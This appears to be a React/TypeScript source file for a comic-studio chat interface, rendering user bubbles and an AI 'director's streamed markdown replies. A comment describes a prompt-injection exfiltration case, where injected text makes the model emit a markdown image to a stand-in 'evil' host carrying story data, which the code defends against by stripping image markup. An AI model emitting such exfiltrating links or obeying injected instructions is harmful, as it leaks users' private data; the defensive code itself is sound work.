// Conversation messages: the user's bubbles (right, with attachment thumbnails) and the
// director's replies (left, avatar mark, markdown text that streams with a caret, then its
// live cards, then acting next-step chips under the latest reply — priced, "Free" when $0,
// run directly when they can be, so a tap rarely costs a director call).

import React, { useState } from 'react';
import { AlertCircle, Feather, FileText, Pencil, RotateCcw, X } from 'lucide-react';
import type { AssetRef, Msg } from '../../../shared/comic/doc';
import { ChatMarkdown } from '../../chat/ChatMarkdown';
import type { PendingAttachment } from '../types';
import type { ComicStudioController } from '../useStudio';
import { CardRenderer } from './cards/CardRenderer';
import { NextStepChips, chipsFor } from './cards/NextStepChips';
import { cx } from './ui';

const CLAMP_CHARS = 700;
const CLAMP_LINES = 12;

export const DirectorMark: React.FC<{ className?: string }> = ({ className }) => (
  <span
    aria-hidden
    className={cx(
      'grid h-7 w-7 shrink-0 place-items-center rounded-full bg-[linear-gradient(135deg,#E8916F_0%,#D97757_55%,#B8573A_100%)] text-white shadow-[0_1px_3px_rgba(217,119,87,0.35)]',
      className
    )}
  >
    <Feather className="h-3.5 w-3.5" />
  </span>
);

const isLong = (text: string) => text.length > CLAMP_CHARS || text.split('\n').length > CLAMP_LINES;

// Director replies render through ChatMarkdown, whose sanitizer keeps remote `<img src>`
// and the SPA ships no CSP. Because the director's context carries the user's private
// premise, cast and notes (some derived from attached/pasted text), an injected instruction
// could make it emit `![](https://evil/x?d=<story data>)` — which the browser fetches with
// zero clicks the moment the delta streams in, leaking the story. The director speaks in
// plain sentences and shows visuals through cards, so it never needs markdown images:
// strip image markup down to its alt text before rendering. (ChatMarkdown is shared with
// the main chat, which does use thumbnails, so the stripping stays local to the director.)
const stripMarkdownImages = (text: string): string =>
  text
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1') // inline  ![alt](url)
    .replace(/!\[([^\]]*)\]\[[^\]]*\]/g, '$1') // reference  ![alt][id]
    .replace(/!\[([^\]]*)\]/g, '$1'); // shortcut  ![alt]

// ── User ─────────────────────────────────────────────────────────────────────

export interface UserBubbleProps {
  text: string;
  attachments?: Array<AssetRef | PendingAttachment>;
  urlFor: (asset?: AssetRef | string | null) => string | undefined;
  status?: 'sending' | 'failed';
  error?: string;
  onRetry?: () => void;
  onEdit?: () => void;
  onDismiss?: () => void;
}

const isPending = (a: AssetRef | PendingAttachment): a is PendingAttachment => 'dataUrl' in a;
const attachmentSrc = (a: AssetRef | PendingAttachment, urlFor: UserBubbleProps['urlFor']) => (isPending(a) ? a.dataUrl : urlFor(a));

export const UserBubble: React.FC<UserBubbleProps> = ({ text, attachments = [], urlFor, status, error, onRetry, onEdit, onDismiss }) => {
  const [expanded, setExpanded] = useState(false);
  const long = isLong(text);
  return (
    <div className="flex flex-col items-end gap-1.5 pl-10 studio-reveal" data-role="user">
      {attachments.length > 0 && (
        <div className="flex flex-wrap justify-end gap-1.5">
          {attachments.map((a, i) => {
            if (isPending(a) && !a.mimeType.startsWith('image/')) {
              return (
                <span key={i} className="inline-flex h-10 max-w-[200px] items-center gap-2 rounded-xl border border-[var(--ds-hairline)] bg-[var(--ds-surface-soft)] px-2.5 text-[12px] text-[var(--ds-ink)]">
                  <FileText className="h-4 w-4 shrink-0 text-[var(--ds-accent)]" aria-hidden />
                  <span className="truncate">{a.name}</span>
                </span>
              );
            }
            const src = attachmentSrc(a, urlFor);
            const name = isPending(a) ? a.name : 'Attachment';
            return src ? (
              <img key={i} src={src} alt={name} className="h-16 w-16 rounded-xl border border-[var(--ds-hairline)] object-cover" />
            ) : (
              <span key={i} className="studio-shimmer h-16 w-16 rounded-xl" aria-label="Loading attachment" />
            );
          })}
        </div>
      )}
      {text && (
        <div
          className={cx(
            'max-w-full rounded-2xl rounded-br-md border border-[var(--ds-hairline-soft)] bg-[var(--ds-raised)] px-3.5 py-2.5 text-[14px] leading-relaxed text-[var(--ds-ink)] shadow-[0_1px_2px_rgba(0,0,0,0.04)]',
            status === 'sending' && 'opacity-80',
            status === 'failed' && 'border-red-500/30'
          )}
        >
          <p className={cx('whitespace-pre-wrap break-words', long && !expanded && 'line-clamp-[10]')}>{text}</p>
          {long && (
            <button
              type="button"
              onClick={() => setExpanded((v) => !v)}
              className="mt-1 text-[12px] font-medium text-[var(--ds-accent)] hover:underline"
              aria-expanded={expanded}
            >
              {expanded ? 'Show less' : 'Show all'}
            </button>
          )}
        </div>
      )}
      {status === 'failed' && (
        // Reason on its own line, actions together under it — never a lone ✕ wrapping onto a row.
        <div role="alert" className="flex max-w-full flex-col items-end gap-1 text-[12px]">
          <span className="inline-flex max-w-[92%] items-start gap-1 text-right text-red-600 dark:text-red-300">
            <AlertCircle className="mt-px h-3.5 w-3.5 shrink-0" aria-hidden />
            Not sent{error ? ` — ${error}` : ''}
          </span>
          {(onRetry || onEdit || onDismiss) && (
            <span className="inline-flex items-center gap-1">
              {onRetry && (
                <button type="button" onClick={onRetry} className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-semibold text-[var(--ds-ink)] hover:bg-[var(--ds-hover)]">
                  <RotateCcw className="h-3 w-3" aria-hidden /> Retry
                </button>
              )}
              {onEdit && (
                <button type="button" onClick={onEdit} className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-medium text-[var(--ds-muted)] hover:bg-[var(--ds-hover)] hover:text-[var(--ds-ink)]">
                  <Pencil className="h-3 w-3" aria-hidden /> Edit
                </button>
              )}
              {onDismiss && (
                <button
                  type="button"
                  onClick={onDismiss}
                  aria-label="Discard message"
                  className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-medium text-[var(--ds-muted)] hover:bg-[var(--ds-hover)] hover:text-[var(--ds-ink)]"
                >
                  <X className="h-3 w-3" aria-hidden /> Discard
                </button>
              )}
            </span>
          )}
        </div>
      )}
    </div>
  );
};

// ── Assistant ────────────────────────────────────────────────────────────────

export interface AssistantMessageProps {
  msg: Msg;
  /** Streaming text (longer than the committed text). */
  draft?: string;
  /** Show the blinking caret (a director turn is streaming into this message). */
  streaming?: boolean;
  /** Show next-step chips (latest reply, nothing after it, not busy). */
  showSuggestions?: boolean;
  studio: ComicStudioController;
}

export const StreamingCaret: React.FC = () => (
  <span aria-hidden className="ml-0.5 inline-block h-[1.05em] w-[2px] translate-y-[2px] animate-pulse rounded-full bg-[var(--ds-accent)] align-baseline" />
);

export const AssistantMessage: React.FC<AssistantMessageProps> = ({ msg, draft, streaming, showSuggestions, studio }) => {
  const text = stripMarkdownImages(draft ?? msg.text ?? '');
  const cards = Array.isArray(msg.cards) ? msg.cards : [];
  // The latest reply always offers a next move: its own nextSteps, else old suggestions, else
  // a free client-side step ("See the pages" / "Read it") so the conversation never dead-ends.
  const chips = showSuggestions ? chipsFor(msg, studio.doc, { fallback: true }) : [];
  // Never silent: a committed reply with no words and no cards still says something.
  const silent = !text && !streaming && cards.length === 0;
  return (
    <div className="flex min-w-0 gap-3 pr-2 studio-reveal" data-role="assistant">
      <DirectorMark className="mt-0.5" />
      <div className="min-w-0 flex-1 space-y-3">
        {(text || streaming) && (
          <div className="min-w-0 text-[14px] leading-relaxed text-[var(--ds-ink)] [overflow-wrap:anywhere]">
            {text ? <ChatMarkdown text={text} className="comicstudio-md" /> : null}
            {streaming && <StreamingCaret />}
          </div>
        )}
        {silent && <p className="text-[13.5px] leading-relaxed text-[var(--ds-muted)]">Done — the board shows the latest.</p>}
        {cards.map((card) => (
          <div key={card.id} className="min-w-0 studio-reveal">
            <CardRenderer card={card} studio={studio} message={msg} />
          </div>
        ))}
        <NextStepChips chips={chips} studio={studio} />
      </div>
    </div>
  );
};
